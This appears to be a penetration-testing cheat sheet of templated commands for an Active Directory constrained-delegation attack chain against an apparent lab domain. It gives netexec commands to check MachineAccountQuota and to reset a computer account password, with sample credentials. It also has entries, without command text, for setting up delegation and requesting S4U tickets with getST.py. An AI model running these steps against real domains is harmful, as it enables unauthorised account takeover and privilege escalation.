commands.title: Check MachineAccountQuota (netexec ldap)
commands.description: Query the domain controller for MachineAccountQuota using netexec's LDAP module.
commands.template:
netexec ldap {ip} -u {username} -p '{password}' -M maq

Example:
netexec ldap dc.redelegate.vl -u marie.curie -p 'Fall2024!' -M maq

commands.title: Enable constrained delegation on a computer (PowerShell)
commands.description: Mark a computer account as trusted for delegation and add an msDS-AllowedToDelegateTo entry using PowerShell (Get/Set-AD* cmdlets).

commands.title: Change computer account password (netexec smb)
commands.description: Use netexec's SMB module to change a computer account password (operator must have rights to change the computer account).
commands.template:
netexec smb {ip} -u {username} -p {password} -M change-password -o USER='{computer}$' NEWPASS=Password123!

Example:
netexec smb dc.redelegate.vl -u helen.frost -p Password123 -M change-password -o USER='FS01$' NEWPASS=Password123

commands.title: Request service ticket / S4U flow (getST.py)
commands.description: Request S4U2Self / S4U2Proxy to obtain a service ticket for an SPN using a computer account credential (getST.py template).
